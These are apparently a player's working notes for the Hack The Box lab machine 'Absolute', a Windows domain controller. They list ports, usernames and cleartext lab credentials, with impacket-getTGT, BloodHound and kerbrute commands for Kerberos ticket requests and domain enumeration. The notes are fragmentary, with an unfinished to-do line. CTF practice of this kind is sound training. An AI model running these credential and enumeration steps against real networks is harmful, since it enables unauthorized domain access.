# Absolute Notes

## Data 

IP: 10.129.147.44
OS: Windows 10.0 Build 17763 x64
Hostname: 
Domain:  dc.absolute.htb absolute.htb
Domain SID: S-1-5-21-4078382237-1492182817-2568127209
Machine Purpose: Domain Controller
Services:53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49673,49692,49693,49699,49704,49714,49718
Service Languages:
Users: m.chaffrey,j.roberts,s.osvald,j.robinson,d.klay,n.smith
Credentials:

```
d.klay : Darkmoonsky248girl
```

## Objectives

## Target Map

## Solution Inventory Map


### Todo 


Reset the dae

### Done

```
d.klay@ABSOLUTE.HTB : Darkmoonsky248girl

SVC_SMB@ABSOLUTE.HTB : AbsoluteSMBService123!
```
      
```bash
sed -i 's/10.129.229.59/10.129.229.59/g' Absolute-*.md

sudo sed -i 's/10.129.229.59/10.129.229.59/g' /etc/hosts

echo "10.129.229.59 dc.absolute.htb absolute.htb" | sudo tee -a /etc/hosts
sudo ntpdate -s dc.absolute.htb
impacket-getTGT -dc-ip 10.129.229.59 absolute.htb/d.klay:Darkmoonsky248girl
impacket-getTGT -dc-ip 10.129.229.59 absolute.htb/SVC_SMB:AbsoluteSMBService123!
# /opt/BloodHound.py/bloodhound.py
# bloodhound-python
# Beware docker container need to be sync to DC!

KRB5CCNAME=d.klay.ccache $bloodhoundPythonInstallMethod -k -dc dc.absolute.htb -ns 10.129.229.59 -c all -d absolute.htb -u d.klay -p 'Darkmoonsky248girl' --zip
```

VM requires
```bash
cd /opt/
git clone https://github.com/ropnop/kerbrute.git
wait
cd kerbrute/
go build
wait
cd /opt/
echo "\n# Kerbrute Alias" | tee -a ~/.zshrc
echo "alias kerbrute='/opt/kerbrute/kerbrute" | tee -a ~/.zshrc


source ~/.zshrc
```